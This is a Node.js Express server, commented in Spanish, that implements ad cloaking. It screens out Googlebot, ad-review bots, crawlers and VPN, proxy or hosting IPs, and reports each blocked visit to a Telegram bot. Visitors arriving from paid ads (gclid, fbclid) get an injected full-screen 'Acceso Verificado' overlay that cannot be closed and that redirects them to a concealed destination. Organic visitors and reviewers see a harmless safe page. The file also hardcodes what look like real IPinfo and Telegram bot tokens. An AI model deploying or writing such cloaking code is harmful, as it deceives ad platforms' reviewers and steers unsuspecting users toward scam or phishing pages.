const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();

app.use(cors());

const CONFIG = {
    IPINFO_TOKEN: 'f14749fee64f8f', 
    TG_TOKEN: '8260412488:AAFCSGGrgSu9-mF7d7SjdI5bJ9cMa3WIqUY',
    TG_CHAT: '-1003321543933',
    DESTINO: 'https://google.com', 
    PORT: process.env.PORT || 3000
};

// --- LÓGICA DE FILTRADO ---
async function verificarVisitante(req) {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    const ua = (req.headers['user-agent'] || '').toLowerCase();

    console.log(`\n🔎 IP: ${ip} | UA: ${ua.substring(0, 20)}...`);

    if (ip === '::1' || ip === '127.0.0.1' || ip.includes('192.168.') || ip.includes('::ffff:127.0.0.1')) {
        console.log("✅ LOCALHOST: Filtros desactivados.");
        return { ok: true };
    }

    const bots = ['googlebot', 'adsbot', 'lighthouse', 'bot', 'crawler', 'spider', 'headless', 'facebook'];
    if (bots.some(b => ua.includes(b))) return { ok: false, r: "Bot Detectado" };

    try {
        const { data } = await axios.get(`https://ipinfo.io/${ip}?token=${CONFIG.IPINFO_TOKEN}`);
        if (data.privacy && (data.privacy.vpn || data.privacy.proxy || data.privacy.hosting)) {
            return { ok: false, r: "VPN Detectada", d: data };
        }
        return { ok: true, d: data };
    } catch (e) {
        return { ok: true }; 
    }
}

// --- RUTA PRINCIPAL ---
app.get('/:slug', async (req, res) => {
    if (req.params.slug.length < 3) return res.status(404).end();

    const check = await verificarVisitante(req);

    // CASO A: BLOQUEADO (Bot/VPN)
    if (!check.ok) {
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
        axios.post(`https://api.telegram.org/bot${CONFIG.TG_TOKEN}/sendMessage`, {
            chat_id: CONFIG.TG_CHAT,
            text: `🚫 *BLOQUEO*\nIP: \`${ip}\`\nMotivo: ${check.r}`,
            parse_mode: 'Markdown'
        }).catch(()=>{});

        res.set('Content-Type', 'application/javascript');
        return res.send("console.log('⛔ BLOQUEADO'); window.__view = true;");
    }

    // CASO B: APROBADO
    console.log("🚀 Enviando lógica de redirección...");
    res.set('Content-Type', 'application/javascript');
    
    // MODIFICACIÓN PRINCIPAL AQUÍ
    const payload = `
        (function(){
            var url = window.location.href;
            console.log("Analizando URL:", url);

            var triggers = ["gclid", "gad_source", "gbraid", "fbclid"];
            var esTraficoPago = triggers.some(function(t) { return url.indexOf(t) !== -1; });

            if (esTraficoPago) {
                console.log("🚀 TRAFICO PAGO DETECTADO -> MOSTRANDO MODAL");

                function mostrarModal() {
                    // 1. Ocultamos el preloader
                    var l = document.getElementById('preloader');
                    if(l) l.style.display = 'none';

                    // 2. Creamos el overlay oscuro que no se puede cerrar
                    var overlay = document.createElement('div');
                    overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:9999999;display:flex;justify-content:center;align-items:center;";

                    // 3. Creamos la caja blanca del modal
                    var modal = document.createElement('div');
                    modal.style.cssText = "background:#ffffff;padding:40px 30px;border-radius:12px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.5);max-width:90%;width:400px;font-family:Arial, sans-serif;";

                    // 4. Agregamos el texto
                    modal.innerHTML = '<h2 style="margin:0 0 15px 0;color:#222;font-size:24px;">Acceso Verificado</h2>' +
                                      '<p style="color:#555;margin:0 0 25px 0;font-size:16px;line-height:1.5;">Tu conexión es segura. Haz clic en el botón de abajo para continuar a tu destino.</p>';

                    // 5. Creamos el botón de redirección
                    var btn = document.createElement('button');
                    btn.innerText = "Continuar";
                    btn.style.cssText = "background:#0a1e3c;color:#fff;border:none;padding:15px 30px;font-size:18px;border-radius:6px;cursor:pointer;font-weight:bold;width:100%;transition:background 0.3s;";
                    
                    // Efecto hover del botón
                    btn.onmouseover = function() { this.style.backgroundColor = '#0f2c5c'; };
                    btn.onmouseout = function() { this.style.backgroundColor = '#0a1e3c'; };

                    // 6. La acción: Redireccionar al hacer click
                    btn.onclick = function() {
                        btn.innerText = "Cargando...";
                        btn.style.opacity = "0.7";
                        btn.disabled = true; // Evita doble click
                        var params = window.location.search || "";
                        window.top.location.href = "${CONFIG.DESTINO}" + params;
                    };

                    // Ensamblamos todo y lo inyectamos en la pantalla
                    modal.appendChild(btn);
                    overlay.appendChild(modal);
                    document.body.appendChild(overlay);
                }

                // Nos aseguramos de que el body exista antes de inyectar el modal
                if (document.body) {
                    mostrarModal();
                } else {
                    document.addEventListener('DOMContentLoaded', mostrarModal);
                }

            } else {
                console.log("👀 TRAFICO ORGANICO -> MOSTRANDO SAFE PAGE");
                window.__view = true;
                var l = document.getElementById('preloader');
                if(l) l.style.display = 'none';
            }
        })();
    `;
    res.send(payload);
});

app.listen(CONFIG.PORT, () => console.log(`🔥 SERVER EN PUERTO ${CONFIG.PORT}`));
